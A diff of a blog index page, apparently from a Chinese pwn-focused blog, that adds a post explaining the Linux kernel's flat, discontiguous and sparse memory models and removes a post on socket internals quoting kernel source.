@@ -156,6 +156,211 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/10/02/Linux%20%E5%86%85%E5%AD%98%E6%A8%A1%E5%9E%8B%E7%AE%80%E6%9E%90/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="yhellow">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Pwn进你的心">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/10/02/Linux%20%E5%86%85%E5%AD%98%E6%A8%A1%E5%9E%8B%E7%AE%80%E6%9E%90/" class="post-title-link" itemprop="url">Linux 内存模型简析</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2022-10-02 21:51:26 / Modified: 21:54:12" itemprop="dateCreated datePublished" datetime="2022-10-02T21:51:26+08:00">2022-10-02</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Knowledge/" itemprop="url" rel="index"><span itemprop="name">Knowledge</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="Symbols count in article">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+              <span>2.6k</span>
+            </span>
+            <span class="post-meta-item" title="Reading time">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+              <span>2 mins.</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p><strong>memory model</strong></p>
+<p>在 Linux 内核中支持3种内存模型，分别为：</p>
+<ul>
+<li>flat memory model（平坦内存模型）</li>
+<li>discontiguous memory model（不连续内存模型）</li>
+<li>sparse memory model（稀疏内存模型）</li>
+</ul>
+<p>所谓 memory model（内存模型），其实就是从 CPU 的角度看其物理内存的分布情况，代表了在 Linux Kernel 中，使用什么的方式来管理这些物理内存（某些体系架构支持多种内存模型，但在内核编译构建时只能选择使用一种内存模型）</p>
+<ul>
+<li>程序分段和 CPU 内存分段是不同的概念 </li>
+</ul>
+<img src="/2022/10/02/Linux%20%E5%86%85%E5%AD%98%E6%A8%A1%E5%9E%8B%E7%AE%80%E6%9E%90/1664695526151.png" class width="1664695526151"> 
+<p>在 <code>include/asm-generic/memory_model.h</code> 中，Linux 为每个 memory model 准备了如下的宏定义：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> page_to_pfn __page_to_pfn <span class="comment">/* 虚拟内存-&gt;物理内存 */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pfn_to_page __pfn_to_page <span class="comment">/* 物理内存-&gt;虚拟内存 */</span></span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>用于把虚拟内存中的 <code>struct page</code> 和切分后的物理内存 <code>page frame</code> 关联起来</li>
+</ul>
+<p><strong>Flat memory model（平坦内存模型）</strong></p>
+<p>平坦内存模型是相对于多段模型而言的</p>
+<ul>
+<li>8086实模式CPU的16位寄存器最多只能在一个内存段的64kb空间内寻址，要是超过64kb，它只能先变换段基址，来达到长距离取指的目的</li>
+<li>平坦模型至始至终只有一个段，它能直接访问内存空间，不用再进行段基址的变换</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __pfn_to_page(pfn)	(mem_map + ((pfn) - ARCH_PFN_OFFSET))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __page_to_pfn(page)	((unsigned long)((page) - mem_map) + \</span></span><br><span class="line"><span class="meta">				 ARCH_PFN_OFFSET)</span></span><br></pre></td></tr></table></figure>
+<p>图示：</p>
+<img src="/2022/10/02/Linux%20%E5%86%85%E5%AD%98%E6%A8%A1%E5%9E%8B%E7%AE%80%E6%9E%90/1664699048502.png" class width="1664699048502"> 
+<ul>
+<li>对于 flat memory model 来说，物理内存本身是连续的</li>
+<li>如果不连续的话，那么中间一部分物理地址是没有对应的物理内存，就会形成一个个洞，这就浪费了 mem_map 数组本身占用的内存空间</li>
+</ul>
+<p>其特点如下：</p>
+<ul>
+<li>内存连续且不存在空隙</li>
+<li>通常应用于 UMA 系统（一致内存访问）</li>
+<li>通过 CONFIG_FLATMEM 进行配置</li>
+</ul>
+<p><strong>Discontiguous memory model（不连续内存模型）</strong></p>
+<p>如果CPU在访问物理内存的时候，其地址空间是有一些空洞的，是不连续的，那么这种计算机系统的内存模型就是 discontiguous memory model </p>
+<ul>
+<li>discontiguous memory model 是为了 NUMA 系统设计的（非一致内存访问）</li>
+<li>NUMA 系统中每个 CPU 都有自己的本地内存，CPU 访问本地内存不用过总线，因而速度要快很多，每个 CPU 和内存在一起，称为一个 NUMA 节点</li>
+<li>NUMA 中的每个节点 Node 用一个 pglist_data 的结构体表示 </li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __pfn_to_page(pfn)			\</span></span><br><span class="line"><span class="meta">(&#123;	unsigned long __pfn = (pfn);		\</span></span><br><span class="line"><span class="meta">	unsigned long __nid = arch_pfn_to_nid(__pfn);  \</span></span><br><span class="line"><span class="meta">	NODE_DATA(__nid)-&gt;node_mem_map + arch_local_page_offset(__pfn, __nid);\</span></span><br><span class="line"><span class="meta">&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __page_to_pfn(pg)						\</span></span><br><span class="line"><span class="meta">(&#123;	const struct page *__pg = (pg);					\</span></span><br><span class="line"><span class="meta">	struct pglist_data *__pgdat = NODE_DATA(page_to_nid(__pg));	\</span></span><br><span class="line"><span class="meta">	(unsigned long)(__pg - __pgdat-&gt;node_mem_map) +			\</span></span><br><span class="line"><span class="meta">	 __pgdat-&gt;node_start_pfn;					\</span></span><br><span class="line"><span class="meta">&#125;)</span></span><br></pre></td></tr></table></figure>
+<p>图示：</p>
+<img src="/2022/10/02/Linux%20%E5%86%85%E5%AD%98%E6%A8%A1%E5%9E%8B%E7%AE%80%E6%9E%90/1664699135513.png" class width="1664699135513"> 
+<ul>
+<li>由于每个 CPU 都有自己的本地内存，导致了物理内存必然有一些空洞</li>
+</ul>
+<p>其特点如下：</p>
+<ul>
+<li>多个内存节点不连续并且存在空隙</li>
+<li>适用于 UMA 系统和 NUMA 系统</li>
+<li>通过 CONFIG_CONTIGMEM 配置</li>
+</ul>
+<p>随着 sparse memory model 的提出，这种内存模型也逐渐被弃用了（ARM在2010年已经移除了对 discontiguous memory model 的支持）</p>
+<p><strong>Sparse memory model（稀疏内存模型）</strong></p>
+<p>sparse memory model 是为了解决 discontiguous memory model 存在的弊端，而被提出的</p>
+<ul>
+<li>连续的地址空间按照 section 被分成一段一段的，其中每一个 section 都是 Hotplug 的，因此内存地址空间可以被切分的更细，支持更离散的不连续内存</li>
+<li>被管理的物理内存由一个个任意大小的 mem_section 构成，因此整个物理内存可被视为一个 mem_section 数组，每个 mem_section 包含了一个间接指向 page 数组的指针</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __page_to_pfn(pg)					\</span></span><br><span class="line"><span class="meta">(&#123;	const struct page *__pg = (pg);				\</span></span><br><span class="line"><span class="meta">	int __sec = page_to_section(__pg);			\</span></span><br><span class="line"><span class="meta">	(unsigned long)(__pg - __section_mem_map_addr(__nr_to_section(__sec)));	\</span></span><br><span class="line"><span class="meta">&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __pfn_to_page(pfn)				\</span></span><br><span class="line"><span class="meta">(&#123;	unsigned long __pfn = (pfn);			\</span></span><br><span class="line"><span class="meta">	struct mem_section *__sec = __pfn_to_section(__pfn);	\</span></span><br><span class="line"><span class="meta">	__section_mem_map_addr(__sec) + __pfn;		\</span></span><br><span class="line"><span class="meta">&#125;)</span></span><br></pre></td></tr></table></figure>
+<p>图示：</p>
+<img src="/2022/10/02/Linux%20%E5%86%85%E5%AD%98%E6%A8%A1%E5%9E%8B%E7%AE%80%E6%9E%90/1664699863779.png" class width="1664699863779"> 
+<p>其特点如下：</p>
+<ul>
+<li>多个内存区域不连续并且存在空隙</li>
+<li>以 section 为单位管理 online 和 hot-plug 内存</li>
+<li>支持内存热插拔(hot plug memory)，但性能稍逊色于 DISCONTIGMEM</li>
+<li>在x86或ARM64内存采用该中模型，其性能比 DISCONTIGMEM 更优并且与 FLATMEM 相当</li>
+<li>对于ARM64平台默认选择该内存模型</li>
+<li>通过 CONFIG_SPARSEMEM 配置</li>
+</ul>
+<p><strong>平台内存模型支持</strong></p>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th>系统架构</th>
+<th>FLATMEM</th>
+<th>DISCONTIGMEM</th>
+<th>SPARSEMEM</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>ARM</td>
+<td>默认</td>
+<td>不支持</td>
+<td>某些系统可选配置</td>
+</tr>
+<tr>
+<td>ARM64</td>
+<td>不支持</td>
+<td>不支持</td>
+<td>默认</td>
+</tr>
+<tr>
+<td>x86_32</td>
+<td>默认</td>
+<td>不支持</td>
+<td>可配置</td>
+</tr>
+<tr>
+<td>x86_32(NUMA)</td>
+<td>不支持</td>
+<td>默认</td>
+<td>可配置</td>
+</tr>
+<tr>
+<td>x86_64</td>
+<td>不支持</td>
+<td>不支持</td>
+<td>默认</td>
+</tr>
+<tr>
+<td>x86_64(NUMA)</td>
+<td>不支持</td>
+<td>不支持</td>
+<td>默认</td>
+</tr>
+</tbody>
+</table>
+</div>
+<p>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/u012489236/article/details/106323088#:~:text=Linux提供了三种内存模型（ include%2Fasm-generic%2Fmemory_model.h ），一般处理器架构支持一种或者多种内存模型，这个在编译阶段就已经确定，比如目前在ARM64中，使用的 Sparse Memory Model,。 2.1 FLAT memory model (平坦内存模型">linux内存模型</a>) </p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
     <link itemprop="mainEntityOfPage" href="http://example.com/2022/10/01/JavaScript%20pwn+%E7%B1%BB%E5%9E%8B%E6%B7%B7%E6%B7%86/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -2218,254 +2423,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/09/06/Principles%EF%BC%9ASocket%E5%BA%95%E5%B1%82%E5%8E%9F%E7%90%86/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="yhellow">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Pwn进你的心">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/09/06/Principles%EF%BC%9ASocket%E5%BA%95%E5%B1%82%E5%8E%9F%E7%90%86/" class="post-title-link" itemprop="url">Principles：Socket底层原理</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2022-09-06 16:56:15" itemprop="dateCreated datePublished" datetime="2022-09-06T16:56:15+08:00">2022-09-06</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2022-10-01 15:16:12" itemprop="dateModified" datetime="2022-10-01T15:16:12+08:00">2022-10-01</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Principles/" itemprop="url" rel="index"><span itemprop="name">Principles</span></a>
-                </span>
-            </span>
-
-          
-            <span class="post-meta-item" title="Symbols count in article">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-              <span>9k</span>
-            </span>
-            <span class="post-meta-item" title="Reading time">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-              <span>8 mins.</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p><strong>Socket 基础知识</strong></p>
-<p>相比于其他 IPC 方式，Socket 更牛的地方在于，它不仅仅可以做到同一台主机内跨进程通信，它还可以做到不同主机间的跨进程通信</p>
-<ul>
-<li>“IP+端口+协议”的组合就可以唯一标识网络中一台主机上的一个进程</li>
-<li>信息依靠 <strong>操作系统和网络栈</strong> 从发送端 Socket 到接收端 Socket</li>
-</ul>
-<p>一个完整的 Socket 的组成应该是由<strong><code>[协议，本地地址，本地端口，远程地址，远程端口]</code></strong> 组成的一个5维数组</p>
-<ul>
-<li>发送端：<strong><code>[tcp，发送端IP，发送端port，接收端IP，接收端port]</code></strong></li>
-<li>接收端：<strong><code>[tcp，接收端IP，接收端port，发送端IP，发送端port]</code></strong></li>
-</ul>
-<img src="/2022/09/06/Principles%EF%BC%9ASocket%E5%BA%95%E5%B1%82%E5%8E%9F%E7%90%86/1641474031711-1664608572272.png" class width="1641474031711">  
-<ul>
-<li>函数 <code>socket</code> 用于为本进程生成一个 Socket 描述符，内核中都有一个表，保存了该进程申请并占用的所有 socket 描述符</li>
-<li>服务端需要 <code>bind</code> 一个 <code>struct sockaddr</code>，其目的是为了指定一个固定的 IP/port 和地址族（因为客户端需要知道服务器基础信息才能通信）</li>
-</ul>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> &#123;</span></span><br><span class="line">    <span class="keyword">short</span> <span class="keyword">int</span> sin_family; <span class="comment">/* 地址族(底层用来递交数据的通信协议) */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">short</span> <span class="keyword">int</span> sin_port; <span class="comment">/* 端口号 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">in_addr</span> <span class="title">sin_addr</span>;</span> <span class="comment">/* Internet地址 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> sin_zero[<span class="number">8</span>]; <span class="comment">/* 为了让sockaddr与sockaddr_in两个数据结构保持大小相同而保留的空字节 */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
-<ul>
-<li>客户端就不需要 <code>bind</code>，而是在 <code>connect</code> 时由系统分配端口（<code>connect</code> 的参数为服务端的 <code>struct sockaddr</code>）</li>
-<li>然后服务器开始监听该 port，循环执行 <code>accept</code>，并等待客户端 <code>connect</code></li>
-</ul>
-<p><strong>Linux 网络数据包</strong></p>
-<p>网卡收包从整体上是网线中的高低电平转换到网卡 FIFO 存储，再拷贝到系统主内存的过程</p>
-<p>接收数据包是一个复杂的过程，涉及很多底层的技术细节，但大致需要以下几个步骤：</p>
-<ul>
-<li>网卡收到数据包</li>
-<li>将数据包从网卡硬件缓存转移到服务器内存中（内核缓存 <code>sk_buffer</code>）</li>
-<li>通知内核处理</li>
-<li>经过 TCP/IP 协议逐层处理</li>
-<li>应用程序通过 <code>read</code> 从 socket buffer 读取数据</li>
-</ul>
-<p>这里就重点分析一下数据包传输到内核的过程：</p>
-<p>NIC（Network Interface Card，网卡）在接收到数据包之后，首先需要将数据同步到内核中，具体流程如下：</p>
-<ul>
-<li>驱动在内存中分配一片缓冲区用来接收数据包，叫做 <code>sk_buffer</code></li>
-<li>将上述缓冲区的地址和大小（即接收描述符），加入到 <code>RX ring buffer</code></li>
-<li>驱动通知网卡有一个新的描述符</li>
-<li>网卡从 <code>RX ring buffer</code> 中取出描述符，从而获知缓冲区的地址和大小</li>
-<li>网卡收到新的数据包</li>
-<li>网卡将新数据包通过 <code>DMA</code> 直接写到 <code>sk_buffer</code> 中<ul>
-<li><code>RX ring buffer</code>：网络栈接收数据环形缓存区</li>
-<li><code>DMA</code>：Direct Memory Access 直接存储器访问，外部设备不通过CPU而直接与系统内存交换数据的接口技术</li>
-</ul>
-</li>
-</ul>
-<p>这个时候，数据包已经被转移到了 <code>sk_buffer</code> 中，接着就会通过中断告诉内核有新数据进来了，内核会完成接下来的工作（内核会把工作交给 [网络协议栈] 去处理，以后慢慢看）</p>
-<p><strong>Socket 底层原理</strong></p>
-<p>其实 Socket 就是应用层与 TCP/IP 协议族通信的中间软件抽象层，它是一组接口：</p>
-<img src="/2022/09/06/Principles%EF%BC%9ASocket%E5%BA%95%E5%B1%82%E5%8E%9F%E7%90%86/1641473787712-1664608572272.png" class width="1641473787712"> 
-<ul>
-<li>Socket 可以大大简化“网络通信编程”，我们不需要完全掌握这种编程的各个细节，只需要使用 Socket 的接口就可以完成 Linux 传输网络数据包的各个步骤</li>
-<li>使进程以“操作文件的方式”实现网络数据包的传输</li>
-</ul>
-<p>最后 Wireshark 抓个包：（133.server，134.client）</p>
-<img src="/2022/09/06/Principles%EF%BC%9ASocket%E5%BA%95%E5%B1%82%E5%8E%9F%E7%90%86/1662438399161-1664608572267.png" class width="1662438399161">   
-<ul>
-<li>[NO.1~3]：三次握手（SYN：同步， ACK：确认）</li>
-</ul>
-<img src="/2022/09/06/Principles%EF%BC%9ASocket%E5%BA%95%E5%B1%82%E5%8E%9F%E7%90%86/1641475541309-1664608572272.png" class width="1641475541309"> 
-<ul>
-<li>[NO.4]：client -&gt; server，传输数据（PSH：传输）</li>
-<li>[NO.5~8]：四次释放（FIN：结束）</li>
-</ul>
-<img src="/2022/09/06/Principles%EF%BC%9ASocket%E5%BA%95%E5%B1%82%E5%8E%9F%E7%90%86/1641475703919-1664608572267.png" class width="1641475703919"> 
-<ul>
-<li>可以发现 client 的端口是系统分配的，而 server 的端口是我们在 <code>bind</code> 中指定的</li>
-</ul>
-<p><strong>Linux 端口和进程的关系</strong></p>
-<p>会看 client 和 server 的运行逻辑：</p>
-<ul>
-<li>server 监听自己系统上的一个固定端口</li>
-<li>client 尝试连接 server 上的那个固定端口</li>
-</ul>
-<p>client 和 server 本质上是运行在 shell 上的两个进程，那它们是怎么通过端口建立联系的呢？</p>
-<ul>
-<li>端口是 TCP/IP 协议中的概念，描述的是 TCP 协议上的对应的应用，可以理解为基于 TCP 的系统服务，或者说系统进程（只要把某个进程运行在端口上，它就成为了 TCP 协议上的对应的应用）</li>
-<li>对于每个进程，内核中都有一个表，保存了该进程申请并占用的所有 socket 描述符，在进程看来（socket 其实跟文件也没有什么不同，只不过通过描述符获得的对象不同而已，接口对应的系统调用也不同）</li>
-<li>server 监听一个端口，client 连接一个端口，内核就可以通过端口快速查找并确定需要处理的进程，这两个进程就通过 TCP 协议关联起来了</li>
-</ul>
-<p>当 client 通过 socket 描述符向 server 发送数据后，底层的 “网卡，内核，网络协议栈” 就会用预设的方案来处理数据包，并且把数据存储到 <code>sk_buffer</code> 中</p>
-<p>然后 server 就可以通过读文件的方式，把 <code>sk_buffer</code> 中的数据 <code>read/recv</code> 到本地空间中</p>
-<p><strong>socket 在 Linux 中的实现</strong></p>
-<p>socket 在内核中的实现分为两层：</p>
-<ul>
-<li>BSD socket</li>
-<li>inet socket</li>
-</ul>
-<p>socket 在内核中对应的函数就是 <code>__sys_socket</code></p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __sys_socket(<span class="keyword">int</span> family, <span class="keyword">int</span> type, <span class="keyword">int</span> protocol)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">int</span> retval;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">socket</span> *<span class="title">sock</span>;</span></span><br><span class="line">	<span class="keyword">int</span> flags;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Check the SOCK_* constants for consistency.  */</span></span><br><span class="line">	BUILD_BUG_ON(SOCK_CLOEXEC != O_CLOEXEC);</span><br><span class="line">	BUILD_BUG_ON((SOCK_MAX | SOCK_TYPE_MASK) != SOCK_TYPE_MASK);</span><br><span class="line">	BUILD_BUG_ON(SOCK_CLOEXEC &amp; SOCK_TYPE_MASK);</span><br><span class="line">	BUILD_BUG_ON(SOCK_NONBLOCK &amp; SOCK_TYPE_MASK);</span><br><span class="line"></span><br><span class="line">	flags = type &amp; ~SOCK_TYPE_MASK;</span><br><span class="line">	<span class="keyword">if</span> (flags &amp; ~(SOCK_CLOEXEC | SOCK_NONBLOCK))</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line">	type &amp;= SOCK_TYPE_MASK;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (SOCK_NONBLOCK != O_NONBLOCK &amp;&amp; (flags &amp; SOCK_NONBLOCK))</span><br><span class="line">		flags = (flags &amp; ~SOCK_NONBLOCK) | O_NONBLOCK;</span><br><span class="line"></span><br><span class="line">	retval = sock_create(family, type, protocol, &amp;sock); <span class="comment">/* 创建一个struct socket */</span></span><br><span class="line">	<span class="keyword">if</span> (retval &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">return</span> retval;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> sock_map_fd(sock, flags &amp; (O_CLOEXEC | O_NONBLOCK)); <span class="comment">/* 把它&quot;映射&quot;到vfs中便于应用层操作 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<ul>
-<li><code>__sys_socket</code> 在简单检查了一下标志位后，执行两个核心函数：<code>sock_create</code> 和 <code>sock_map_fd</code></li>
-<li>在分析 <code>__sock_create</code> 之前，先看一下 <code>struct socket</code> 的条目信息：</li>
-</ul>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">socket</span> &#123;</span></span><br><span class="line">	socket_state		state; <span class="comment">/* socket状态 */</span></span><br><span class="line">	<span class="keyword">short</span>			type; <span class="comment">/* socket类型 */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span>		flags; <span class="comment">/* socket标志位 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">socket_wq</span>	*<span class="title">wq</span>;</span> <span class="comment">/* socket等待队列 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">file</span>		*<span class="title">file</span>;</span> <span class="comment">/* gc文件的返回指针 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sock</span>		*<span class="title">sk</span>;</span></span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">proto_ops</span>	*<span class="title">ops</span>;</span> <span class="comment">/* 根据协议类型,保存了每种协议对应的函数 */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
-<p><code>sock_create</code> 的实现：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sock_create</span><span class="params">(<span class="keyword">int</span> family, <span class="keyword">int</span> type, <span class="keyword">int</span> protocol, struct socket **res)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> __sock_create(current-&gt;nsproxy-&gt;net_ns, family, type, protocol, res, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(sock_create);</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> __sock_create(struct net *net, <span class="keyword">int</span> family, <span class="keyword">int</span> type, <span class="keyword">int</span> protocol,</span><br><span class="line">			 struct socket **res, <span class="keyword">int</span> kern)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">int</span> err;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">socket</span> *<span class="title">sock</span>;</span></span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">net_proto_family</span> *<span class="title">pf</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 *      Check protocol is in range</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (family &lt; <span class="number">0</span> || family &gt;= NPROTO)</span><br><span class="line">		<span class="keyword">return</span> -EAFNOSUPPORT;</span><br><span class="line">	<span class="keyword">if</span> (type &lt; <span class="number">0</span> || type &gt;= SOCK_MAX)</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Compatibility.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	   